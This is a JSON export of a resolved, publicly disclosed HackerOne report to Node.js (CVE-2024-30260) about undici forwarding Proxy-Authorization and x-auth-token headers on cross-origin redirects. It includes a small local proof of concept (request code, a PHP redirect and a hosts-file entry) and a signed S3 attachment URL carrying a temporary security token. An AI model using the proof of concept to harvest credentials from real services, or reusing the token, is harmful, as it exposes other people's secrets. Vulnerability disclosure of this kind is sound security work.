@@ -1,0 +1,181 @@
+{
+  "id": 2408074,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yNDA4MDc0",
+  "url": "https://hackerone.com/reports/2408074",
+  "title": "Proxy-Authorization header not cleared on cross-origin redirect in undici.request",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "low",
+  "readable_substate": "Resolved",
+  "created_at": "2024-03-08T04:43:40.119Z",
+  "submitted_at": "2024-03-08T04:43:40.272Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "iylz",
+    "url": "/iylz",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 22984,
+    "url": "https://hackerone.com/nodejs",
+    "handle": "nodejs",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/022/984/e600648ace4a8553247bce967d461a030aa81d49_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/022/984/e600648ace4a8553247bce967d461a030aa81d49_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Node.js",
+      "twitter_handle": "nodejs",
+      "website": "https://nodejs.org",
+      "about": "The Node.js JavaScript Runtime"
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2024-30260"
+  ],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2024-05-03T17:41:07.159Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2024-04-03T17:40:58.479Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "**Summary:**: Undici already cleared Authorization and Cookie headers on cross-origin redirects, but did not clear Proxy-Authorization and x-auth-token headers.\n\n**Description:** \nLike https://github.com/nodejs/undici/security/advisories/GHSA-3787-6prv-h9w3, this is a fixed security issue in v5.28.3, v6.6.1, but I have tested the new version(v6.7.0) and it has not been fixed yet.\n\n## Steps To Reproduce:\nPOC:\n```\nvar undici = require('undici');\n\nconst {\n    statusCode,\n    headers,\n    trailers,\n    body\n} = undici.request({\n    method: 'GET',\n    maxRedirections: 1,\n    origin: \"http://127.0.0.1/\", \n    pathname: \"\",\n    headers: {\n        'content-type': 'application/json',\n        'Cookie': 'secret Cookie',\n        'Authorization': 'secret Authorization',\n        'Proxy-Authorization': 'secret Proxy-Authorization',\n        'x-auth-token': 'secret x-auth-token',\n        'Host': 'test.cn'\n    }\n})\n```\n\nThe http://127.0.0.1/ is a redirect server. Sourcecode:\n```\n<?php\nheader(\"Location: http://a.com:2333\");\n?>\n```\nAdd the 1 record in the /etc/hosts file: \n```\n127.0.0.1   a.com\n```\n\nListening on port 2333 and discovering that Proxy-Authorization and x-auth-token headers has been passed.\n{F3105815}\n\n\n\n## Impact: \n```<=undici@6.7.0```\n\n## Supporting Material/References:\nhttps://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Proxy-Authorization\n\n## Impact\n\nUndici already cleared Authorization and Cookie headers on cross-origin redirects, but did not clear Proxy-Authorization and x-auth-token headers.",
+  "weakness": {
+    "id": 87,
+    "name": "Insufficiently Protected Credentials"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 3105815,
+      "file_name": "image.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/jb2t9dkhoa5rj50gw6vrm5q4a1vg?response-content-disposition=attachment%3B%20filename%3D%22image.png%22%3B%20filename%2A%3DUTF-8%27%27image.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQW6DNA2DM%2F20260607%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260607T125930Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENT%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIBwHgYaj6VuTMMn%2Ft2XknwvFopEj5hTZCUjIqMpc3IwcAiEA3lJZNlZ6JI7hgyNgwDtLVHonylwcoEfjfq0Q2uKeSB4qugUInf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDGuRdXsQtsniHUqZAiqOBdTPfv%2FOEC2OZ4iX17UW6HeHTu%2Bg3BJJ18BgdpuBrVwOImusswfssNcCNHG7bpGt5vKFjaxca5zDl52xmW9WBk4HfWXi85SFiSbK2lhzdbXMDd%2BUhMlg5SC7uAd5UFZ%2F%2FBUL%2BGDELuxNCR8imhcwqnA1SafNlm%2F4jtOOBX4pVIiR3Kpn75uTEMahIPZN8edngLqzvOZBl84OiYZFNNlv4APbaguIYMzIt0MZJ6E6EC%2FboteLn93emofTBJ%2F%2B1nOu5JxI4rCrSV0EWWr3pAq1n865RgPfKK%2BYootJa%2FySZ5tXqXu7VO%2FEbomK18a4DwShxF4qHI8hjcKMjtVF3U7i99UzWwxax4Vd3HfKuXNjPIYoLhgWt0oRlRzPQ6hWDMqf0JAthItTkyWoarXkIRkATcr2hJxfvVbPcIhHVm0ouHkdRZmqyY%2B479KeFvK%2BUPm6DbiFWLD1FNL3p8F0pzl2vZe%2B4jpNFcUfcIum2p1wg%2FWKznflMw7ghdha8%2BuwLUtTYjz8bfAFenJ6o3eArfBtXDQqWwNCKQYQ5frqRq4vAi7m8TJSuvPoX2UYJU7xMtoFja9OrRwCWz0hoht7VrWNCVf%2F3HoOscEKDoLio3Iatldc3Q9KYv2F2DRgZwndf1KNt5d3j3zN8qJzpA7rvS3lYKP0VqVfCmQydsSEHYe7yrY3YpWZSvoKmGeNisThNQbwIMcc1j4pTaAA6FxV5X4qep1Gs4%2Fm4i6L5xKIE1EIXNvHO0nFpQxg%2BuU47yNRuxJap3cSpZGWZCLBTx8BUcy0hwmPuIdpiXQCKm45xPD4fzc86jKKm75HreFob8yJZcFwDMUWUS5WP6RYQVY%2BHRr8bpqZwqXA%2Fr%2FIhFQLtwpfyzDKtJXRBjqxAakorzXfapIxlb%2FTRtlUuNPmAmu49%2FPK%2B%2BcyKvk7uZOtSHT0MKmlvFqb01hGSAQl1Otxe1yn3Yhe5bIU0XcEuRf4n9aWICM3nQApjZh0WeAx3DafUYY34iZ7jq5n7TJU5A%2Bxc9tfi69v5AQrumAq%2BLR5Xzx1YwVrv5tYFznn4wFBVhrC5o0bK8fm3ahYookVtmTzcr0sZ7c4hYe8l6fm9ag9mE4kDALQPV%2BAz9pmOlbH0A%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=fca686ce7226267c8fc6eebc128394ad44ed8c50d556df3ccea5dabae3e8f67d",
+      "file_size": 459276,
+      "type": "image/png",
+      "moderated": false
+    }
+  ],
+  "allow_singular_disclosure_at": "2024-05-03T17:40:58.736Z",
+  "allow_singular_disclosure_after": -66079111.943483055,
+  "singular_disclosure_allowed": true,
+  "vote_count": 9,
+  "voters": [
+    "zy9ard3",
+    "pr0f0x01",
+    "neilx",
+    "m45hrur",
+    "null__byte",
+    "soohongkim123",
+    "destinedtohack",
+    "8501",
+    "aecherli"
+  ],
+  "severity": {
+    "rating": "low",
+    "author_type": "Team"
+  },
+  "structured_scope": {
+    "databaseId": 666,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/nodejs/node",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "can_manage?": false,
+    "can_export?": false,
+    "can_add_comment?": false,
+    "can_request_decision_review_without_strict_acl_mode?": false,
+    "can_request_decision_review?": false,
+    "can_reject_decision_review?": false,
+    "can_change_state?": false,
+    "can_reopen?": false,
+    "can_award_bounty?": false,
+    "can_award_swag?": false,
+    "can_suggest_bounty_amount?": false,
+    "can_create_dupe_window_bounty?": false,
+    "can_assign_to_user?": false,
+    "can_assign_to_h1_triage?": false,
+    "can_hide_timeline?": false,
+    "can_agree_on_going_public?": false,
+    "can_cancel_disclosure_request?": false,
+    "can_be_publicly_disclosed?": false,
+    "can_post_internal_comments?": false,
+    "can_manage_common_responses?": false,
+    "can_use_common_responses?": false,
+    "can_reassign_to_team?": false,
+    "can_change_title?": false,
+    "can_change_vulnerability_information?": false,
+    "can_change_weakness?": false,
+    "can_be_manually_disclosed?": false,
+    "can_clone?": false,
+    "can_close_as_na?": false,
+    "can_close_as_duplicate?": false,
+    "can_close_as_informative?": false,
+    "can_close_as_spam?": false,
+    "can_close_as_resolved?": false,
+    "can_ban_researcher?": false,
+    "can_create_severity?": false,
+    "can_close_comments?": false,
+    "can_change_structured_scope?": false,
+    "can_manage_collaborators?": false,
+    "can_view_bounty_weights?": false,
+    "can_redact?": false,
+    "can_view_credential_account_details?": false,
+    "can_request_retest?": false,
+    "can_cancel_retest?": false,
+    "can_submit_draft?": false,
+    "can_delete_draft?": false,
+    "can_change_to_pending_program_review_state?": false,
+    "can_request_code_review?": false,
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "can_change_pentest": false,
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
